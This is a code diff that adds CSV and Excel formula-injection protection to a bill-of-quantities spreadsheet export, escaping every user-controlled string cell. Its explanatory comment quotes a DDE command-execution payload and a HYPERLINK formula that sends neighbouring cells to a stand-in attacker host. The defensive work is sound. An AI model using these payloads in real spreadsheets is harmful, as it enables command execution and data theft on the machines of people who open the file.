@@ -44,6 +44,42 @@ export interface ExportOptions {
 const CURRENCY_FMT = '#,##0.00';
 const QTY_FMT = '#,##0.00';
 
+/**
+ * Excel & CSV formula-injection defence.
+ *
+ * If a cell value starts with one of the formula-trigger characters
+ * (``=``, ``+``, ``-``, ``@``, tab, CR, LF) Excel / LibreOffice
+ * interprets it as a formula when the workbook is opened. Without
+ * neutralisation a row whose ``description`` was pasted from a PDF
+ * (or any user-controlled source) can run arbitrary commands —
+ * ``=cmd|'/C calc'!A1`` is the canonical proof, but real-world
+ * attacks use ``=HYPERLINK("http://attacker/?c="&A1,"click")`` to
+ * exfiltrate adjacent cells.
+ *
+ * The fix is industry-standard: prefix the cell with a single ASCII
+ * apostrophe (``'``). Excel renders the cell content unchanged but
+ * treats it as a literal string. ExcelJS preserves the leading
+ * apostrophe when writing, so the protection survives round-trip.
+ *
+ * We deliberately keep this client-side AND mirror it in the backend
+ * (``app.core.csv_safety.neutralise_formula``) — defence in depth.
+ *
+ * @see https://owasp.org/www-community/attacks/CSV_Injection
+ */
+export function neutraliseFormula(value: unknown): string {
+  if (value === null || value === undefined) return '';
+  const s = String(value);
+  if (s.length === 0) return s;
+  // Trigger chars per OWASP + Microsoft guidance. Tab/CR/LF are
+  // included because Excel evaluates them as separators that allow
+  // a leading formula in the next "cell".
+  const TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r', '\n']);
+  if (TRIGGERS.has(s[0]!)) {
+    return `'${s}`;
+  }
+  return s;
+}
+
 interface Resource {
   name: string;
   code?: string;
@@ -173,9 +209,13 @@ export function buildBOQSheetData(options: ExportOptions): {
   // ── Data rows ─────────────────────────────────────────────────────────
   for (const group of grouped.sections) {
     const sectionRowIdx = rows.length;
+    // Audit F1 \u2014 wrap every user-controlled string field through
+    // ``neutraliseFormula`` so a malicious description / unit / resource
+    // name pasted from a PDF or upstream catalogue cannot become an
+    // executable formula when the spreadsheet is opened.
     rows.push([
-      group.section.ordinal,
-      group.section.description,
+      neutraliseFormula(group.section.ordinal),
+      neutraliseFormula(group.section.description),
       null,
       null,
       null,
@@ -188,13 +228,18 @@ export function buildBOQSheetData(options: ExportOptions): {
 
     for (const child of group.children) {
       rows.push([
-        child.ordinal,
-        child.description,
-        child.unit,
+        neutraliseFormula(child.ordinal),
+        neutraliseFormula(child.description),
+        neutraliseFormula(child.unit),
         child.quantity,
         child.unit_rate,
         child.total,
-        getVariantCellValue(child),
+        // getVariantCellValue can return number, string, or null; only
+        // strings need neutralisation.
+        (() => {
+          const v = getVariantCellValue(child);
+          return typeof v === 'string' ? neutraliseFormula(v) : v;
+        })(),
         null,
         null,
       ]);
@@ -202,21 +247,23 @@ export function buildBOQSheetData(options: ExportOptions): {
         const rTotal = r.total ?? r.quantity * r.unit_rate;
         rows.push([
           null,
-          `    \u2514 ${r.name}`,
-          r.unit,
+          // The leading "\u2514 " is safe (no trigger char) but the appended
+          // ``r.name`` is user-controlled \u2014 neutralise the whole cell.
+          neutraliseFormula(`    \u2514 ${r.name}`),
+          neutraliseFormula(r.unit),
           r.quantity,
           r.unit_rate,
           rTotal,
           null,
-          r.type || '',
-          r.code || '',
+          neutraliseFormula(r.type || ''),
+          neutraliseFormula(r.code || ''),
         ]);
       }
     }
 
     rows.push([
       null,
-      `Subtotal: ${group.section.description}`,
+      neutraliseFormula(`Subtotal: ${group.section.description}`),
       null,
       null,
       null,
@@ -234,13 +281,16 @@ export function buildBOQSheetData(options: ExportOptions): {
   for (const pos of grouped.ungrouped) {
     if (isSection(pos)) continue;
     rows.push([
-      pos.ordinal,
-      pos.description,
-      pos.unit,
+      neutraliseFormula(pos.ordinal),
+      neutraliseFormula(pos.description),
+      neutraliseFormula(pos.unit),
       pos.quantity,
       pos.unit_rate,
       pos.total,
-      getVariantCellValue(pos),
+      (() => {
+        const v = getVariantCellValue(pos);
+        return typeof v === 'string' ? neutraliseFormula(v) : v;
+      })(),
       null,
       null,
     ]);
@@ -248,14 +298,14 @@ export function buildBOQSheetData(options: ExportOptions): {
       const rTotal = r.total ?? r.quantity * r.unit_rate;
       rows.push([
         null,
-        `    \u2514 ${r.name}`,
-        r.unit,
+        neutraliseFormula(`    \u2514 ${r.name}`),
+        neutraliseFormula(r.unit),
         r.quantity,
         r.unit_rate,
         rTotal,
         null,
-        r.type || '',
-        r.code || '',
+        neutraliseFormula(r.type || ''),
+        neutraliseFormula(r.code || ''),
       ]);
     }
   }
